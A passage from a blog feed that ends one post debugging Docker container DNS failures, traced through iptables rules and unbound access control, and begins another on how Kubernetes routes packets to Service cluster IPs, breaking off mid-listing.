-e FOO_DOCKER_IMAGE=my-project:20210422T065801-2b5452d -e 'FOO_DOCKER_ARGS=wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-02' -e FOO_EXECUTION_ID=foorun-3feaee45-35e4-4c01-9430-86de52eb2db1 -e FOO_TRIGGER_ID=foo-f721de7f-edf9-4bb3-8cdf-1e9bbcec5035 -e FOO_TRIGGER_TYPE=foo -e FOO_ENVIRONMENT=foo -e FOO_LOGGING=text -e GOOGLE_APPLICATION_CREDENTIALS=/etc/_foo/gcp-sa-key.json -e FOO_SERVICE_ACCOUNT=dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com gcr.io/xpn-1/my-project:20210422T065801-2b5452d wrap-luigi --module luigi_tasks DumpKubernetesContainerImagesJob --when 2021-04-02`
</code></pre>

<p>The only background knowledge we need to know here is that the qux container is sending a Google
Service Account (GSA) JSON credential with <code>"token_uri": "http://172.20.0.127:80/token"</code>. Bar
then uses that token for further GCP API requests. So bar needs to query DNS for
accounts.google.com. Bar container logs show that it cannot lookup the DNS A record for
accounts.google.com by querying <code>127.0.0.11:53</code>.</p>

<pre><code>dxia@my-host:~$ docker ps
CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   9 hours ago         Up 9 hours          0.0.0.0:8080-&gt;80/tcp      nginx1
3f9cc17b3f71        foo/bar:latest                                   "./bar"               9 hours ago         Up 9 hours          0.0.0.0:80-&gt;80/tcp        bar

dxia@my-host:~$ docker logs --follow bar
2021/04/22 05:54:19 bar started
2021/04/22 06:59:13 Received JWT assertion: [REDACTED base-64 string]
2021/04/22 06:59:13 Servive account name:  projects/-/serviceAccounts/dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com
2021/04/22 06:59:28 Post https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com:generateAccessToken?alt=json&amp;prettyPrint=false: Post https://accounts.google.com/o/oauth2/token: dial tcp: lookup accounts.google.com on 127.0.0.11:53: read udp 127.0.0.1:46920-&gt;127.0.0.11:53: i/o timeout
2021/04/22 06:59:28 Failed to create new token for dump-k8-deployment-info-pipeli@my-project.iam.gserviceaccount.com
</code></pre>

<p>I wondered why bar was querying <code>127.0.0.11</code> for DNS. It turns out this is another loopback
address. In fact, all of <code>127.0.0.0/8</code> is loopback according to <a href="https://tools.ietf.org/html/rfc6890">RFC-6890</a>. I guess Docker
containers that are attached to user-defined Docker networks are configured by default to use
<code>127.0.0.11</code> in their <code>/etc/resolv.conf</code>.</p>

<pre><code>dxia@my-host$ docker ps
CONTAINER ID        IMAGE                                                                    COMMAND                  CREATED             STATUS              PORTS                     NAMES
1b0b2b981f93        nginx:latest                                                             "/docker-entrypoint.…"   9 hours ago         Up 9 hours          0.0.0.0:8080-&gt;80/tcp      nginx1
3f9cc17b3f71        foo/bar:latest                                   "./bar"               9 hours ago         Up 9 hours          0.0.0.0:80-&gt;80/tcp        bar

dxia@my-host$ docker exec -it nginx1 /bin/sh -c "cat /etc/resolv.conf"

search corp.net
nameserver 127.0.0.11
options attempts:1 timeout:5 ndots:0
</code></pre>

<p>Why were these Docker containers configured to query for DNS records on <code>127.0.0.11</code>? It turned
out after some Googling that</p>

<blockquote><p>By default, a container inherits the DNS settings of the host, as defined in the /etc/resolv.conf
configuration file. Containers that use the default bridge network get a copy of this file,
whereas containers that use a custom network use Docker’s embedded DNS server, which forwards
external DNS lookups to the DNS servers configured on the host.</p></blockquote>

<p>&mdash; <a href="https://docs.docker.com/config/containers/container-networking/">https://docs.docker.com/config/containers/container-networking/</a></p>

<p>Now I wondered if Docker&rsquo;s embedded DNS server is actually running. After some more Googling, I
realized that each container also had its own set of firewall rules. So I listed bar&rsquo;s nat
table&rsquo;s <code>DOCKER_OUTPUT</code> chain&rsquo;s rules. These two rules showed that the destination port is
changed for TCP packets bound for 127.0.0.11:53 to 37619. UDP packets have their port changed to
58552.</p>

<pre><code>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) sudo iptables --list DOCKER_OUTPUT --verbose --numeric --line-numbers --table nat

Chain DOCKER_OUTPUT (1 references)
 pkts bytes target     prot opt in     out     source               destination
    0     0 DNAT       tcp  --  *      *       0.0.0.0/0            127.0.0.11           tcp dpt:53 to:127.0.0.11:37619
    0     0 DNAT       udp  --  *      *       0.0.0.0/0            127.0.0.11           udp dpt:53 to:127.0.0.11:58552
</code></pre>

<p>Whatever&rsquo;s listening on those ports was accepting TCP and UDP connections.</p>

<pre><code>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) nc 127.0.0.11 58552 -nvzu -w 5
(UNKNOWN) [127.0.0.11] 58552 (?) open
dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) nc 127.0.0.11 37619 -nvz -w 5
(UNKNOWN) [127.0.0.11] 37619 (?) open
</code></pre>

<p>But there was no DNS reply from either.</p>

<pre><code>dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 -p 58552 accounts.google.com

; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 -p 58552 accounts.google.com
; (1 server found)
;; global options: +cmd
;; connection timed out; no servers could be reached

dxia@my-host$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 -p 37619 accounts.google.com +tcp

; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 -p 37619 accounts.google.com +tcp
; (1 server found)
;; global options: +cmd
;; connection timed out; no servers could be reached
</code></pre>

<p>Docker daemon was listening for DNS queries at that IP and port from within bar.</p>

<pre><code>dxia@my-host$ sudo nsenter -n -p -t $(docker inspect --format  bar) ss -utnlp
Netid        State          Recv-Q         Send-Q                    Local Address:Port                    Peer Address:Port
udp          UNCONN         0              0                            127.0.0.11:58552                        0.0.0.0:*             users:(("dockerd",pid=10984,fd=38))
tcp          LISTEN         0              128                          127.0.0.11:37619                        0.0.0.0:*             users:(("dockerd",pid=10984,fd=40))
tcp          LISTEN         0              128                                   *:80                                 *:*             users:(("bar",pid=12150,fd=3))
</code></pre>

<p>After enabling <code>log-level": "debug"</code> in <code>/etc/docker/daemon.json</code> and reloading the configuration
file, I saw that the daemon was trying to forward the DNS query to 10.99.0.1. This was the IP of
the <code>corp0</code> bridge network interface which we create instead of the default <code>docker0</code> bridge
network. I saw there was an IO timeout when the daemon was waiting for the DNS reply.</p>

<pre><code>dxia@my-host$ sudo journalctl --follow -u docker
-- Logs begin at Tue 2019-11-05 18:17:27 UTC. --
Apr 22 15:43:12 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:12.496979903Z" level=debug msg="[resolver] read from DNS server failed, read udp 172.20.0.127:37928-&gt;10.99.0.1:53: i/o timeout"
Apr 22 15:43:13 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:13.496539033Z" level=debug msg="Name To resolve: accounts.google.com."
Apr 22 15:43:13 my-host.corp.net dockerd[10984]: time="2021-04-22T15:43:13.496958664Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:51642, forwarding to udp:10.99.0.1"
</code></pre>

<p>We set dockerd&rsquo;s upstream DNS server as 10.99.0.1 because we have unbound running as a DNS
proxy/cache on the host. We configured it to bind on the bridge interface so Docker containers
can hit the host-local unbound instance by routing DNS requests to corp0.</p>

<p>So why can&rsquo;t the daemon forward IP packets from 172.20.0.127:37928 to 10.99.0.1:53? It seemed
like UDP packets sent from bar were able to reach 10.99.0.1:53, but DNS requests failed. I also
knew DNS requests from the host to 10.99.0.1:53 worked.</p>

<pre><code>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) nc 10.99.0.1 53 -nvzu -w 5
(UNKNOWN) [10.99.0.1] 53 (domain) open

dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @10.99.0.1 accounts.google.com

; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @10.99.0.1 accounts.google.com
; (1 server found)
;; global options: +cmd
;; connection timed out; no servers could be reached

dxia@my-host:~$ dig @10.99.0.1 accounts.google.com

; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @10.99.0.1 accounts.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 39308
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;accounts.google.com.       IN  A

;; ANSWER SECTION:
accounts.google.com.    108 IN  A   142.250.31.84

;; Query time: 1 msec
;; SERVER: 10.99.0.1#53(10.99.0.1)
;; WHEN: Mon Apr 26 23:58:28 UTC 2021
;; MSG SIZE  rcvd: 64
</code></pre>

<p>My hypothesis at this point was that Docker&rsquo;s embedded DNS server wasn&rsquo;t working in some way.
After exploring this for a while with no luck, I questioned my assumption that UDP packets from
172.20.0.127:37928 were able to reach 10.99.0.1:53. I realized TCP packets from
172.20.0.127:37928 were not able to reach 10.99.0.1:53.</p>

<pre><code>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) nc 10.99.0.1 53 -nvz -w 5
(UNKNOWN) [10.99.0.1] 53 (domain) : Connection timed out
</code></pre>

<p>So why were UDP packets able to? Isn&rsquo;t UDP a fire-and-forget protocol? How can <code>nc</code> even tell if
an IP and port is listening for UDP packets at all? It was good that I backtracked and questioned
my assumption because it turns out that one <a href="https://serverfault.com/questions/416205/testing-udp-port-connectivity/416269#416269">cannot distinguish between an open UDP port and
dropped packets en route to that port</a>.</p>

<p>So it must be another networking issue which means there must be another firewall rule that&rsquo;s
blocking packets from the bar container to 10.99.0.1. After a while of looking, I realized the
filter table&rsquo;s <code>INPUT</code> chain&rsquo;s default policy was <code>DROP</code> and that there was no rule that matched
packets coming in from the <code>br-8ce7e363e4f9</code> interface.</p>

<pre><code>dxia@my-host:~$ sudo iptables --list INPUT --verbose --numeric --line-numbers --table filter
Chain INPUT (policy DROP 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1     434M  345G            all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth0 input */
2        0     0            all  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth1 input */
3     7080  283K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 drop invalid */ ctstate INVALID
4    1907M  568G ipthrouput  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 track forward */
5     987M  414G ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 001 accept established */ ctstate RELATED,ESTABLISHED
6     763M   95G ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0            /* 002 allow local */
7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 003 accept ipsec */ policy match dir in pol ipsec
8        1    28 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 004 allow icmp */ icmptype 8 limit: avg 10/sec burst 5
9        0     0 DROP       icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 005 drop icmp */
10       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 006 block JMX on service net */
11       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 020 deny direct access to JMX port on helios nodes */ reject-with icmp-port-unreachable
12       0     0 DROP       all  --  eth0   *       10.48.64.0/22        0.0.0.0/0            /* 08 drop traffic from osxenv 10.48.64.0/22 */
13       0     0 DROP       all  --  eth0   *       10.97.16.0/21        0.0.0.0/0            /* 08 drop traffic from osxenv 10.97.16.0/21 */
14       0     0 DROP       all  --  eth0   *       172.24.32.0/22       0.0.0.0/0            /* 08 drop traffic from windowsbuildagentsenv 172.24.32.0/22 */
15       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from buildagent machines */ match-set buildagent src
16       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from paymentbamboo machines */ match-set paymentbamboo src
17   18168 1094K ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow service nets */ match-set service_nets src
18     134  8496 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow tech offices */ match-set tech_offices src
19       0     0 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow testenv */ match-set testenv src
20       0     0 ACCEPT     all  --  eth0   *       130.211.0.0/22       0.0.0.0/0            /* 10 Google networks for 130.211.0.0/22 */
21       0     0 ACCEPT     all  --  eth0   *       35.191.0.0/16        0.0.0.0/0            /* 10 Google networks for 35.191.0.0/16 */
22       0     0 LOG        tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth0: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth0: "
23       0     0 LOG        tcp  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth1: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth1: "
24       0     0 ACCEPT     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all docker0 traffic */
25    158M   59G ACCEPT     all  --  corp0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all corp0 traffic */
26       0     0 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 500 allow ssh on service net */ ctstate NEW recent: SET name: DEFAULT side: source mask: 255.255.255.255
27       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 501 limit ssh on service net */ ctstate NEW recent: UPDATE seconds: 180 hit_count: 20 name: DEFAULT side: source mask: 255.255.255.255
</code></pre>

<p>So I added a matching rule that accepted those packets manually.</p>

<pre><code>sudo iptables --table filter --append INPUT --in-interface br-8ce7e363e4f9 --source 0.0.0.0/0 --destination 0.0.0.0/0 --jump ACCEPT

dxia@my-host:~$ sudo iptables --list INPUT --verbose --numeric --line-numbers --table filter
Chain INPUT (policy DROP 0 packets, 0 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1     434M  345G            all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth0 input */
2        0     0            all  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth1 input */
3     7080  283K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 drop invalid */ ctstate INVALID
4    1908M  568G ipthrouput  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 track forward */
5     987M  414G ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 001 accept established */ ctstate RELATED,ESTABLISHED
6     763M   95G ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0            /* 002 allow local */
7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 003 accept ipsec */ policy match dir in pol ipsec
8        1    28 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 004 allow icmp */ icmptype 8 limit: avg 10/sec burst 5
9        0     0 DROP       icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 005 drop icmp */
10       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 006 block JMX on service net */
11       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 020 deny direct access to JMX port on helios nodes */ reject-with icmp-port-unreachable
12       0     0 DROP       all  --  eth0   *       10.48.64.0/22        0.0.0.0/0            /* 08 drop traffic from osxenv 10.48.64.0/22 */
13       0     0 DROP       all  --  eth0   *       10.97.16.0/21        0.0.0.0/0            /* 08 drop traffic from osxenv 10.97.16.0/21 */
14       0     0 DROP       all  --  eth0   *       172.24.32.0/22       0.0.0.0/0            /* 08 drop traffic from windowsbuildagentsenv 172.24.32.0/22 */
15       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from buildagent machines */ match-set buildagent src
16       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from paymentbamboo machines */ match-set paymentbamboo src
17   18168 1094K ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow service nets */ match-set service_nets src
18     134  8496 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow tech offices */ match-set tech_offices src
19       0     0 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow testenv */ match-set testenv src
20       0     0 ACCEPT     all  --  eth0   *       130.211.0.0/22       0.0.0.0/0            /* 10 Google networks for 130.211.0.0/22 */
21       0     0 ACCEPT     all  --  eth0   *       35.191.0.0/16        0.0.0.0/0            /* 10 Google networks for 35.191.0.0/16 */
22       0     0 LOG        tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth0: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth0: "
23       0     0 LOG        tcp  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth1: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth1: "
24       0     0 ACCEPT     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all docker0 traffic */
25    158M   59G ACCEPT     all  --  corp0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all corp0 traffic */
26       0     0 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 500 allow ssh on service net */ ctstate NEW recent: SET name: DEFAULT side: source mask: 255.255.255.255
27       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 501 limit ssh on service net */ ctstate NEW recent: UPDATE seconds: 180 hit_count: 20 name: DEFAULT side: source mask: 255.255.255.255
28       0     0 ACCEPT     all  --  br-8ce7e363e4f9 *       0.0.0.0/0            0.0.0.0/0
</code></pre>

<p>I retried querying for accounts.google.com, and I got a DNS reply!</p>

<pre><code>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 accounts.google.com

; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 accounts.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: REFUSED, id: 9592
;; flags: qr rd ad; QUERY: 0, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
;; WARNING: recursion requested but not available

;; Query time: 0 msec
;; SERVER: 127.0.0.11#53(127.0.0.11)
;; WHEN: Tue Apr 27 00:07:13 UTC 2021
;; MSG SIZE  rcvd: 12
</code></pre>

<p>But&hellip; there&rsquo;s no A records? Docker daemon logs stated that the upstream local unbound DNS server
did not return any A records.</p>

<h2>Error #3: unbound refused to reply to DNS queries from a private IP range used by the Docker network we&rsquo;re using</h2>

<pre><code>Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864160829Z" level=debug msg="Name To resolve: accounts.google.com."
Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864325564Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:57576, forwarding to udp:10.99.0.1"
Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864537556Z" level=debug msg="[resolver] external DNS udp:10.99.0.1 did not return any A records for \"accounts.google.com.\""
</code></pre>

<p>Hm, I noticed the status in the empty DNS reply is <code>REFUSED</code>. I recalled that <a href="https://linux.die.net/man/5/unbound.conf">unbound supports
configuring which DNS queries it will reply to based on originating interface and
IP</a>.</p>

<pre><code>dxia@my-host:~$ grep access-control /etc/unbound/unbound.conf
    access-control: 127.0.0.1 allow
    access-control: 10.99.0.0/24 allow
    access-control: 10.174.18.90 allow
</code></pre>

<p>Bingo! There&rsquo;s no <code>access-control</code> entry that allowed DNS queries from 172.20.0.127. I added
<code>access-control: 172.16.0.0/12 allow</code> (since all of 172.16.0.0/12 is private IPv4 address space
according to <a href="https://tools.ietf.org/html/rfc1918">RFC-1918</a>) and reloaded unbound. Now it worked!</p>

<pre><code>dxia@my-host:~$ sudo systemctl reload unbound
dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 accounts.google.com

; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 accounts.google.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36432
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;accounts.google.com.       IN  A

;; ANSWER SECTION:
accounts.google.com.    143 IN  A   74.125.202.84

;; Query time: 2 msec
;; SERVER: 127.0.0.11#53(127.0.0.11)
;; WHEN: Tue Apr 27 00:11:41 UTC 2021
;; MSG SIZE  rcvd: 64
</code></pre>

<p>Docker daemon logs showed the following.</p>

<pre><code>Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.957934764Z" level=debug msg="Name To resolve: accounts.google.com."
Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.958087666Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:33346, forwarding to udp:10.99.0.1"
Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.960007990Z" level=debug msg="[resolver] received A record \"74.125.202.84\" for \"accounts.google.com.\" from udp:10.99.0.1"
</code></pre>

<h2>General Debugging Strategies and Techniques I Used</h2>

<p>Here are the general debugging strategies I used and reinforced for myself.</p>

<ul>
<li>When network requests fail, go down one layer on the stack to identify on exactly which layer it
fails. I.e. find out which protocol is responsible for the failure: HTTP, TCP, IP?</li>
<li>Try to reproduce the error by running the most direct and minimal command that simulates my actual
failure. In this case, an HTTP request made by <code>gcloud</code> was failing. I translated that into an <code>nc</code> command
that simulated the establishment of the TCP connection between containers. Or a DNS query from
bar was failing. I translated that into a <code>dig</code> command. And in all these cases, the origin of
these IP packets mattered. So knowing how to use <code>nsenter</code> to enter a network namespace and create
IP packets that originate from the same container was useful. <code>nsenter</code> is essential when debugging
containers that don&rsquo;t have any tools installed in them. The bar image only contains one
go-compiled executable. There&rsquo;s no other tools I can use in there.</li>
<li>I encountered three errors in this case. Tackle one error at a time, and don&rsquo;t give up.</li>
<li>Be scientific. Have a working hypothesis at each step for which you collect evidence that either
supports or refutes it.</li>
<li>If you get stuck, go back and question your previous assumptions or conclusions. Are there other
tests you can run that can confirm or disprove what you thought was true?</li>
</ul>


<h2>Patches</h2>

<p>Error #1: I created a patch that makes our Puppet installation ignore rules created by Docker
networks in the filter table&rsquo;s FORWARD chain.</p>

<p>Error #2: Unfortunately, I don&rsquo;t think there&rsquo;s a good solution to this other than disabling our
GCE VM&rsquo;s periodic Puppet runs and manually adding a rule to allow packets from the new interface.
The chain&rsquo;s default policy is <code>DROP</code>, and interface names are dynamic.</p>

<p>Error #3: I made a patch that makes unbound reply to DNS queries with source IPs of in the range
<code>172.16.0.0/12</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Kubernetes Routes IP Packets to Services' Cluster IPs]]></title>
    <link href="https://www.davidxia.com/2021/01/how-kubernetes-routes-ip-packets-to-services-cluster-ips/"/>
    <updated>2021-01-27T13:22:02-05:00</updated>
    <id>https://www.davidxia.com/2021/01/how-kubernetes-routes-ip-packets-to-services-cluster-ips</id>
    <content type="html"><![CDATA[<p>I recently observed DNS resolution errors on a large Kubernetes (K8s) cluster. This behavior was
only happening on 0.1% of K8s nodes. But the fact that this behavior wasn&rsquo;t self-healing and
crippled tenant workloads in addition to my penchant to chase rabbits down holes meant I
wasn&rsquo;t going to let it go. I emerged learning how K8s Services&#8217; Cluster IP feature actually works.
Explaining this feature and my particular problem and speculative fix is the goal of this post.</p>

<h2>The Problem</h2>

<p>The large K8s cluster is actually a Google Kubernetes Engine (GKE) cluster with master version
1.17.14-gke.400 and node version 1.17.13-gke.2600. This is a multi-tenant cluster with hundreds of
nodes. Each node runs dozens of user workloads. Some users said DNS resolution within their Pods on
certain nodes weren&rsquo;t working. I was able to reproduce this behavior with the following steps.</p>

<p>Kubernetes schedules <code>kube-dns</code> Pods and a Service on the cluster that provide DNS and configures
kubelets to tell individual containers to use the DNS Service&rsquo;s IP to resolve DNS names. <a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/">See K8s
docs here</a>. First I get the <code>kube-dns</code>&lsquo; Service&rsquo;s Cluster IP. This is the IP address to
which DNS queries from Pods are sent.</p>

<pre><code>kubectl --context my-gke-cluster -n kube-system get services kube-dns
NAME       TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)         AGE
kube-dns   ClusterIP   10.178.64.10   &lt;none&gt;        53/UDP,53/TCP   666d
</code></pre>

<p>Then I make DNS queries against the Cluster IP from a Pod running on a broken node.</p>

<!-- more -->


<pre><code># Log into the GKE node
gcloud --project my-project compute ssh my-gke-node --zone us-central1-b --internal-ip

# Need to run toolbox container which has iptables command. Google's Container-Optimized OS doesn't
# have it.
dxia@my-gke-node ~ $ toolbox
20200603-00: Pulling from google-containers/toolbox
Digest: sha256:36e2f6b8aa40328453aed7917860a8dee746c101dfde4464ce173ed402c1ec57
Status: Image is up to date for gcr.io/google-containers/toolbox:20200603-00
gcr.io/google-containers/toolbox:20200603-00
e6b1ee70f91ac405623cbf1d2afa9a532a022dc644bddddd754d2cd786f58273

dxia-gcr.io_google-containers_toolbox-20200603-00
Please do not use --share-system anymore, use $SYSTEMD_NSPAWN_SHARE_* instead.
Spawning container dxia-gcr.io_google-containers_toolbox-20200603-00 on /var/lib/toolbox/dxia-gcr.io_google-containers_toolbox-20200603-00.
Press ^] three times within 1s to kill container.

# Install dig
root@toolbox:~# apt-get update &amp;&amp; apt-get install dnsutils

# Ask the kube-dns Cluster IP to resolve www.google.com
# dig will hang when it's waiting on a DNS reply. So ^C's show DNS resolution failures
root@toolbox:~# for x in $(seq 1 20); do echo ${x}; dig @10.178.64.10 www.google.com &gt; /dev/null; done
1
^C2
^C3
4
5
6
7
8
^C9
10
11
12
13
14
15
^C16
17
18
^C19
20
</code></pre>

<p>I cordoned and drained the node and added the annotation
<code>cluster-autoscaler.kubernetes.io/scale-down-disabled=true</code> to <a href="https://github.com/kubernetes/autoscaler/blob/b470c62bfa6269ed185d21d47dadc339353deb68/cluster-autoscaler/FAQ.md#how-can-i-prevent-cluster-autoscaler-from-scaling-down-a-particular-node">prevent the cluster autoscaler from
deleting it</a>.</p>

<p>Then I performed a more basic test. I tested whether I could even make a TCP connection to the
Cluster IP on port 53 (default DNS port).</p>

<pre><code># Run nc 1000 times without reverse DNS lookup, in verbose and scan mode
# Count only failed connections
root@toolbox:~# for x in $(seq 1 1000); do nc 10.178.64.10 53 -nvz 2&gt;&amp;1 | grep -v open; done | wc -l
257
</code></pre>

<p>A quarter of the TCP connections fail. This means the error is below the DNS layer at TCP layer 3.</p>

<h2>Finding the Root Cause: Down the Rabbit Hole</h2>

<p>Some background for those unfamiliar. K8s nodes (via the <code>kube-proxy</code> DaemonSet) will route IP
packets originating from a Pod with a destination of a K8s Service&rsquo;s Cluster IP to a backing Pod IP
in <a href="https://kubernetes.io/docs/concepts/services-networking/service/#virtual-ips-and-service-proxies">one of three proxy modes</a>: user space, iptables, and IPVS. I&rsquo;m assuming GKE
runs <code>kube-proxy</code> in iptables proxy mode since <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/network-overview#kube-proxy">iptables instead of IPVS is mentioned in their docs
here</a>.</p>

<p><code>kube-proxy</code> should keep the node&rsquo;s iptable rules up to date with the actual <code>kube-dns</code>
Service&rsquo;s endpoints. The following console output shows how I figured out the IP packet flow by
tracing matching iptables rules.</p>

<pre><code># List rules in FORWARD chain's filter table
root@toolbox:~# iptables -L FORWARD -t filter
Chain FORWARD (policy DROP)
target     prot opt source               destination
cali-FORWARD  all  --  anywhere             anywhere             /* cali:wUHhoiAYhphO9Mso */
KUBE-FORWARD  all  --  anywhere             anywhere             /* kubernetes forwarding rules */
KUBE-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes service portals */
DOCKER-USER  all  --  anywhere             anywhere
DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
DOCKER     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere
ACCEPT     udp  --  anywhere             anywhere
ACCEPT     icmp --  anywhere             anywhere
ACCEPT     sctp --  anywhere             anywhere

# List rules in KUBE-SERVICES chain's nat table and look for rules that forward IP packets destined
# for the K8s Service kube-system/kube-dns' Cluster IP
root@toolbox:~# iptables -L KUBE-SERVICES -t nat | grep kube-system/kube-dns | grep SVC
